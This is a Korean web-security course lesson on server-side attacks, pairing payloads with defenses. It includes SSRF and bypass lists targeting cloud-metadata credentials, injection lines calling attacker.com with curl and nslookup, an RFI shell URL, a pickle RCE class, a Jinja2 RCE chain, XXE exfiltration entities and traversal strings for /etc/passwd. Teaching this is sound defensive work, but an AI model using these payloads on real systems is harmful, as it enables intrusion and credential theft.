# 서버측 공격

**이전**: [06. 인증 공격](./06_Authentication_Attacks.md) | **다음**: [08. 클라이언트측 공격](./08_Client_Side_Attacks.md)

---

서버측 공격(Server-Side Attack)은 웹 애플리케이션의 백엔드 인프라를 대상으로 한다. 사용자의 브라우저를 익스플로잇하는 클라이언트측 공격과 달리, 서버측 취약점은 공격자가 서버에서 명령을 실행하고, 민감한 파일을 읽고, 내부 서비스에 대한 요청을 위조하고, 애플리케이션 로직을 조작할 수 있게 한다.

> **중요**: 이 레슨에 설명된 모든 기법은 자신이 소유하거나 명시적인 서면 허가를 받은 시스템에서만 사용해야 한다.

**난이도**: ⭐⭐⭐

## 학습 목표

1. SSRF 취약점을 식별하고 익스플로잇하여 내부 서비스에 접근한다
2. 인젝션 취약점을 통해 OS 명령을 실행한다
3. LFI 및 경로 탐색(path traversal)을 통해 민감한 파일을 읽는다
4. 불안전한 역직렬화(insecure deserialization)를 익스플로잇하여 원격 코드 실행을 달성한다
5. 일반적인 템플릿 엔진에서 SSTI를 탐지하고 익스플로잇한다
6. XXE 페이로드를 제작하여 데이터를 추출하고 SSRF를 달성한다
7. 여러 서버측 취약점을 체이닝하여 최대 영향을 달성한다
8. 효과적인 서버측 방어를 구현한다

---

## 목차

1. [서버측 요청 위조(SSRF)](#1-서버측-요청-위조ssrf)
2. [명령어 인젝션](#2-명령어-인젝션)
3. [로컬 파일 포함(LFI)](#3-로컬-파일-포함lfi)
4. [원격 파일 포함(RFI)](#4-원격-파일-포함rfi)
5. [불안전한 역직렬화](#5-불안전한-역직렬화)
6. [서버측 템플릿 인젝션(SSTI)](#6-서버측-템플릿-인젝션ssti)
7. [XML 외부 엔티티(XXE)](#7-xml-외부-엔티티xxe)
8. [경로 탐색 공격](#8-경로-탐색-공격)
9. [경합 조건](#9-경합-조건)
10. [서버측 방어 전략](#10-서버측-방어-전략)
11. [연습문제](#11-연습문제)
12. [요약](#12-요약)
13. [참고 자료](#13-참고-자료)

---

## 1. 서버측 요청 위조(SSRF)

SSRF(Server-Side Request Forgery)는 애플리케이션이 공격자가 제어하는 URL로 서버측 HTTP 요청을 수행하여 내부 서비스에 접근할 수 있게 할 때 발생한다.

### 1.1 SSRF 공격 시나리오

```
Attacker → Web App → Internal Service (not directly accessible)
                   → Cloud metadata (169.254.169.254)
                   → Internal admin panels
                   → Database servers
```

### 1.2 일반적인 SSRF 대상

```python
"""
SSRF payload generator for authorized security testing.

Generates payloads targeting common internal services
and cloud metadata endpoints.
"""

from dataclasses import dataclass, field


@dataclass
class SSRFPayload:
    """An SSRF test payload."""
    url: str
    description: str
    target: str
    severity: str


SSRF_PAYLOADS = [
    # Cloud metadata
    SSRFPayload("http://169.254.169.254/latest/meta-data/",
                "AWS metadata endpoint", "AWS IMDS", "Critical"),
    SSRFPayload("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "AWS IAM credentials", "AWS IMDS", "Critical"),
    SSRFPayload("http://metadata.google.internal/computeMetadata/v1/",
                "GCP metadata endpoint", "GCP Metadata", "Critical"),

    # Internal services
    SSRFPayload("http://127.0.0.1:6379/", "Redis", "Internal Redis", "High"),
    SSRFPayload("http://127.0.0.1:9200/", "Elasticsearch", "Internal ES", "High"),
    SSRFPayload("http://127.0.0.1:27017/", "MongoDB", "Internal Mongo", "High"),
    SSRFPayload("http://127.0.0.1:8080/admin", "Admin panel", "Internal Admin", "High"),

    # Protocol smuggling
    SSRFPayload("gopher://127.0.0.1:6379/_SET%20key%20value",
                "Redis via gopher", "Protocol smuggling", "Critical"),
    SSRFPayload("file:///etc/passwd", "Local file read", "File access", "High"),
]


# SSRF bypass techniques for URL filters
SSRF_BYPASSES = [
    ("Decimal IP", "http://2130706433/"),  # 127.0.0.1
    ("Hex IP", "http://0x7f000001/"),
    ("Octal IP", "http://0177.0.0.1/"),
    ("IPv6 loopback", "http://[::1]/"),
    ("DNS rebinding", "http://attacker-rebind.example.com/"),
    ("URL encoding", "http://127.0.0.1%2523@evil.com/"),
    ("Redirect", "http://attacker.com/redirect?url=http://127.0.0.1"),
    ("Short URL", "http://127.1/"),
]


if __name__ == "__main__":
    print("SSRF Payload Generator")
    print("=" * 50)
    for p in SSRF_PAYLOADS:
        print(f"  [{p.severity:8s}] {p.description}")
        print(f"           {p.url}")
    print("\nBypass techniques:")
    for name, payload in SSRF_BYPASSES:
        print(f"  {name:20s} {payload}")
```

---

## 2. 명령어 인젝션

명령어 인젝션(Command Injection)은 사용자 입력이 적절한 새니타이제이션(sanitization) 없이 OS 명령에 포함될 때 발생한다.

### 2.1 인젝션 연산자

| 연산자 | 동작 | 예시 |
|--------|------|------|
| `;` | 명령 구분자 | `; cat /etc/passwd` |
| `&&` | AND — 첫 번째가 성공하면 실행 | `&& cat /etc/passwd` |
| `\|\|` | OR — 첫 번째가 실패하면 실행 | `\|\| cat /etc/passwd` |
| `` ` `` | 명령 치환 | `` `whoami` `` |
| `$()` | 명령 치환 | `$(whoami)` |
| `\|` | 파이프 | `\| cat /etc/passwd` |
| `\n` | 개행 | `%0a cat /etc/passwd` |

### 2.2 탐지 및 방지

```python
"""
Command injection testing and prevention module.

Demonstrates vulnerable vs safe command execution patterns.
"""

import subprocess
import shlex
from typing import Optional


# VULNERABLE — never do this
def vulnerable_ping(host: str) -> str:
    """DO NOT USE — demonstrates command injection vulnerability."""
    import os
    return os.popen(f"ping -c 1 {host}").read()
    # Input: "8.8.8.8; cat /etc/passwd" → executes both commands


# SAFE — proper implementation
def safe_ping(host: str) -> Optional[str]:
    """Safe ping implementation using subprocess with argument list."""
    # Validate input
    import re
    if not re.match(r'^[\w.\-]+$', host):
        return None

    try:
        result = subprocess.run(
            ["ping", "-c", "1", host],  # Arguments as list, not string
            capture_output=True, text=True, timeout=10,
        )
        return result.stdout
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None


# Blind command injection detection
BLIND_DETECTION_PAYLOADS = [
    # Time-based
    "; sleep 5",
    "| sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    # Out-of-band (requires collaborator)
    "; nslookup attacker.com",
    "$(curl http://attacker.com/callback)",
]


if __name__ == "__main__":
    print("Command Injection Module")
    print("=" * 40)
    print("\nVulnerable pattern: os.popen(f'ping {user_input}')")
    print("Safe pattern: subprocess.run(['ping', user_input])")
    print("\nBlind detection payloads:")
    for p in BLIND_DETECTION_PAYLOADS:
        print(f"  {p}")
```

---

## 3. 로컬 파일 포함(LFI)

LFI(Local File Inclusion)는 공격자가 서버의 로컬 파일을 포함시켜 잠재적으로 민감한 구성 파일이나 소스 코드를 읽을 수 있게 한다.

### 3.1 일반적인 LFI 페이로드

```
# Basic traversal
../../../etc/passwd
....//....//....//etc/passwd

# Null byte (PHP < 5.3.4)
../../../etc/passwd%00

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input (POST data as code)
expect://whoami

# Useful Linux files
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log (log poisoning)
```

---

## 4. 원격 파일 포함(RFI)

RFI(Remote File Inclusion)는 원격 서버의 파일을 포함시켜 잠재적으로 원격 코드 실행(RCE)을 달성할 수 있게 한다.

```
# Basic RFI
http://target/page?file=http://attacker.com/shell.php

# With null byte
http://target/page?file=http://attacker.com/shell.php%00

# Data URI (PHP)
http://target/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

---

## 5. 불안전한 역직렬화

```python
"""
Deserialization vulnerability demonstration.

Shows how insecure deserialization can lead to
remote code execution in Python applications.
"""

import pickle
import base64
from dataclasses import dataclass


# VULNERABLE: Unpickling untrusted data
class MaliciousPayload:
    """Demonstrates how pickle can execute arbitrary code."""
    def __reduce__(self):
        import os
        return (os.system, ("echo 'RCE achieved'",))


def demonstrate_unsafe_deserialization():
    """Show the danger of deserializing untrusted pickle data."""
    # Create malicious payload
    payload = pickle.dumps(MaliciousPayload())
    encoded = base64.b64encode(payload).decode()

    print(f"Malicious pickle payload (base64): {encoded[:50]}...")
    print("If deserialized with pickle.loads(), this executes OS commands.")
    print("\nNEVER use pickle.loads() on untrusted data!")


# SAFE alternatives
def safe_serialization_example():
    """Demonstrate safe serialization alternatives."""
    import json
    data = {"user": "admin", "role": "viewer"}

    # JSON — safe, no code execution possible
    serialized = json.dumps(data)
    deserialized = json.loads(serialized)
    print(f"JSON (safe): {deserialized}")


if __name__ == "__main__":
    print("Insecure Deserialization Demo")
    print("=" * 50)
    demonstrate_unsafe_deserialization()
    print()
    safe_serialization_example()
```

---

## 6. 서버측 템플릿 인젝션(SSTI)

SSTI(Server-Side Template Injection)는 사용자 입력이 서버측 템플릿에 포함되어 평가될 때 발생한다.

### 6.1 탐지 페이로드

```
{{7*7}}        → 49 (Jinja2, Twig)
${7*7}         → 49 (FreeMarker, Mako)
#{7*7}         → 49 (Thymeleaf)
<%= 7*7 %>     → 49 (ERB)
```

### 6.2 Jinja2 익스플로잇

```python
# Detection
{{config}}
{{config.items()}}

# RCE via Jinja2
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
```

---

## 7. XML 외부 엔티티(XXE)

```xml
<!-- Basic XXE — read file -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- XXE SSRF -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>

<!-- Blind XXE via out-of-band -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?data=exfil">
]>
```

---

## 8. 경로 탐색 공격

```python
"""
Path traversal testing module.

Tests for directory traversal vulnerabilities in file
download/upload functionality.
"""

from dataclasses import dataclass


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode
]


# Defense
def safe_file_access(base_dir: str, user_path: str) -> str:
    """Safely resolve a file path within a base directory."""
    import os
    # Resolve to absolute path
    full_path = os.path.realpath(os.path.join(base_dir, user_path))
    # Verify it's within the base directory
    if not full_path.startswith(os.path.realpath(base_dir)):
        raise PermissionError("Path traversal detected")
    return full_path


if __name__ == "__main__":
    print("Path Traversal Payloads:")
    for p in TRAVERSAL_PAYLOADS:
        print(f"  {p}")
```

---

## 9. 경합 조건

경합 조건(Race Condition)은 결과가 동시 작업의 타이밍에 의존할 때 발생한다.

**일반적인 대상:**
- 쿠폰/할인 코드 적용 (동시에 두 번 사용)
- 파일 업로드 후 유효성 검사 전 접근
- 잔액 이체 (이중 지출)
- 비밀번호 재설정 토큰 생성

---

## 10. 서버측 방어 전략

| 공격 | 방어 |
|------|------|
| SSRF | URL 허용 목록, 내부 범위 차단, 리다이렉트 비활성화 |
| 명령어 인젝션 | 사용자 입력을 셸에 전달하지 않음; 리스트 인자로 subprocess 사용 |
| LFI/RFI | 파일 경로 유효성 검사, 허용 목록 사용, `allow_url_include` 비활성화 |
| 역직렬화 | 신뢰할 수 없는 데이터를 역직렬화하지 않음; JSON 사용 |
| SSTI | 샌드박스된 템플릿 사용, 템플릿 코드에 사용자 입력 삽입 금지 |
| XXE | XML 파서 구성에서 외부 엔티티 비활성화 |
| 경로 탐색 | 경로를 해석하고 허용된 디렉토리 내에 있는지 확인 |

---

## 11. 연습문제

1. **SSRF 실습**: 연습 애플리케이션에서 SSRF를 익스플로잇하여 AWS 메타데이터에 접근한다. 획득한 크리덴셜을 문서화한다.
2. **명령어 인젝션**: DVWA에서 모든 보안 수준의 명령어 인젝션을 찾아 익스플로잇한다.
3. **LFI에서 RCE까지**: LFI를 로그 포이즈닝(log poisoning)과 체이닝하여 원격 코드 실행을 달성한다.
4. **역직렬화**: Python pickle 익스플로잇 페이로드를 생성하고 취약한 애플리케이션에 대해 테스트한다.
5. **SSTI**: Jinja2에서 SSTI를 탐지하고 익스플로잇하여 코드 실행을 달성한다.
6. **방어**: 다룬 각 서버측 공격 유형에 대한 입력 유효성 검사를 구현한다.

---

## 12. 요약

서버측 공격은 데이터 도용부터 전체 시스템 침해까지 치명적인 영향을 미칠 수 있다:

- **SSRF**는 서버를 내부 리소스 접근을 위한 프록시로 전환한다
- **명령어 인젝션**은 직접적인 OS 수준 접근을 제공한다
- **LFI/RFI**는 민감한 파일을 읽거나 악성 코드를 포함한다
- **역직렬화**는 제작된 데이터 구조를 통해 RCE를 달성한다
- **SSTI**는 코드 실행을 위해 템플릿 엔진을 익스플로잇한다
- **XXE**는 파일 읽기 및 SSRF를 위해 XML 파싱을 활용한다
- 방어에는 입력 유효성 검사, 허용 목록 및 안전한 기본값이 필요하다

---

## 13. 참고 자료

- OWASP Server-Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- PortSwigger XXE: https://portswigger.net/web-security/xxe
- HackTricks: https://book.hacktricks.xyz/
